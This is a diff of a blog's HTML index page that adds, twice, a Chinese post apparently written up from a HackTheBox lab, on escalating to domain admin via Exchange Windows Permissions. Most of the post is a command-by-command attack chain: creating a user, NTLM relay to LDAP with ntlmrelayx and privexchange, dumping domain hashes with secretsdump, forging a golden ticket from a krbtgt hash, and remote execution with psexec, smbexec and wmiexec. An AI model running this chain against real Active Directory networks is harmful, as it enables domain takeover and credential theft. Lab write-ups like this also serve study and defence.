@@ -118,6 +118,49 @@
 <!--  <div class="project-card">
   
   <div class="ctnWrap">
+    <a href="/2020/04/26/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BExchange%E6%8F%90%E6%9D%83/" class="title">域控提权之Exchange提权</a>
+    <section class="desc">
+  原理 ：Exchange Windows Permissions组成员在域内具有WriteDacl权限，将该组任意集成组WriteDacl权限的成员身份中继到LDAP后，可以修改域对象的ACL授予用户更高级别的访问权限，执行DCSync
+也就是利用Exchange默认高权限账户进行LDAP中继授予用户DCSync权限
+漏洞利用：net group 查看用户组
+
+或者当前用户不在Exchange Permissions组中，但在Account Operator中（该组的成员能操作用户管理员所属域的账号和组，并可设置其权限。但是该组成员无法修改Administrators及Operators组及权限），可以添加一个用户并加入到Exchange Permissions组
+添加用户tw：
+$pass = ConvertTo-SecureString &quot;password&quot; -AsPlainText -Force
+New-ADUser tw -AccountPassword $pass -Enabled $True将用户添加到Exchange Permissions组
+net group &quot;Exchange Windows Permissions&quot; tw /add 
+或
+Import-Module ActiveDirectory
+Add-ADGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members  tw检查是否已成功添加
+net group &quot;Exchange Windows Permissions&quot; /domain 使用ntlmrelayx.py进行ntlm中继：
+sudo python ntlmrelayx.py -t  ldap://10.10.10.161 --escalate-user tw运行该中继命令之后，可通过浏览器访问本地127.0.0.1进行连接（输入tw账户密码），也可使用prieexchange.py进行连接
+python privexchange.py  -ah 10.10.16.21  10.10.10.161   -u tw-p password -d htb.local（10.10.16.21为我kali ip）
+
+连接成功之后，使用secretdump.py导出域控hash #######时间蛮久的，需要出现上图提示
+impacket-secretsdump htb.local/tw:password@10.10.10.161 -just-dc
+进一步学习：在Linux上使用KRBTGT hash实现金票攻击
+在上面的实验中，同样还获得了KRBTGT hash，下面学习学习如何在Linux上使用它
+首先获取domain sid ：
+Get-ADDomain htb.local
+S-1-5-21-3072663084-364016917-1341370565使用NTLM生成TGT###TGT也可以使用AES-KEY生成
+python ticketer.py -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid  S-1-5-21-3072663084-364016917-1341370565 -domain HTB.LOCAL UserDoesnotExit运行之后生成一个UserDoesnotExit.ccache缓存文件使用ccache设置ticket
+export KRB5CCNAME=UserDoesnotExit.ccache
+使用TGT使用下列任意方式远程执行命令
+python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
+python smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
+python wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass执行之前需要同步域控时间，否则会出现下列错误    sudo rdate 10.10.10.161
+
+python psexec.py HTB.LOCAL/UserDoesnotExit@HTB.LOCAL -k -no-pass不能使用IP进行连接
+
+
+</section>
+    <p class="sub">Apr 26, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
     <a href="/2020/04/25/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8Bms14-068/" class="title">域控提权之ms14-068</a>
     <section class="desc">
   危害：任意域控用户都可以提权到域控一般为本地账户才能成功，但是使用klist purge清除缓存证书可绕过限制
@@ -849,6 +892,64 @@ select id,updatexml(1,concat(user(),0x7e,version()),1) from user;select id from 
     <div class="box-content flex1">
         <div class="swiper-container">
             <div class="swiper-wrapper">
+                
+                    <a title="域控提权之Exchange提权" alt="域控提权之Exchange提权" href="/2020/04/26/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BExchange%E6%8F%90%E6%9D%83/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="域控提权之Exchange提权" alt="域控提权之Exchange提权"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; 域控提权之Exchange提权 &gt;</div>
+                            <div class="content flex1">
+                                
+  原理 ：Exchange Windows Permissions组成员在域内具有WriteDacl权限，将该组任意集成组WriteDacl权限的成员身份中继到LDAP后，可以修改域对象的ACL授予用户更高级别的访问权限，执行DCSync
+也就是利用Exchange默认高权限账户进行LDAP中继授予用户DCSync权限
+漏洞利用：net group 查看用户组
+
+或者当前用户不在Exchange Permissions组中，但在Account Operator中（该组的成员能操作用户管理员所属域的账号和组，并可设置其权限。但是该组成员无法修改Administrators及Operators组及权限），可以添加一个用户并加入到Exchange Permissions组
+添加用户tw：
+$pass = ConvertTo-SecureString &quot;password&quot; -AsPlainText -Force
+New-ADUser tw -AccountPassword $pass -Enabled $True将用户添加到Exchange Permissions组
+net group &quot;Exchange Windows Permissions&quot; tw /add 
+或
+Import-Module ActiveDirectory
+Add-ADGroupMember -Identity &quot;Exchange Windows Permissions&quot; -Members  tw检查是否已成功添加
+net group &quot;Exchange Windows Permissions&quot; /domain 使用ntlmrelayx.py进行ntlm中继：
+sudo python ntlmrelayx.py -t  ldap://10.10.10.161 --escalate-user tw运行该中继命令之后，可通过浏览器访问本地127.0.0.1进行连接（输入tw账户密码），也可使用prieexchange.py进行连接
+python privexchange.py  -ah 10.10.16.21  10.10.10.161   -u tw-p password -d htb.local（10.10.16.21为我kali ip）
+
+连接成功之后，使用secretdump.py导出域控hash #######时间蛮久的，需要出现上图提示
+impacket-secretsdump htb.local/tw:password@10.10.10.161 -just-dc
+进一步学习：在Linux上使用KRBTGT hash实现金票攻击
+在上面的实验中，同样还获得了KRBTGT hash，下面学习学习如何在Linux上使用它
+首先获取domain sid ：
+Get-ADDomain htb.local
+S-1-5-21-3072663084-364016917-1341370565使用NTLM生成TGT###TGT也可以使用AES-KEY生成
+python ticketer.py -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid  S-1-5-21-3072663084-364016917-1341370565 -domain HTB.LOCAL UserDoesnotExit运行之后生成一个UserDoesnotExit.ccache缓存文件使用ccache设置ticket
+export KRB5CCNAME=UserDoesnotExit.ccache
+使用TGT使用下列任意方式远程执行命令
+python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
+python smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
+python wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass执行之前需要同步域控时间，否则会出现下列错误    sudo rdate 10.10.10.161
+
+python psexec.py HTB.LOCAL/UserDoesnotExit@HTB.LOCAL -k -no-pass不能使用IP进行连接
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
+                            </div>
+                        </div>
+                    </a>
                 
                     <a title="域控提权之ms14-068" alt="域控提权之ms14-068" href="/2020/04/25/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8Bms14-068/"
                        class="post-item swiper-slide flex flex-v">
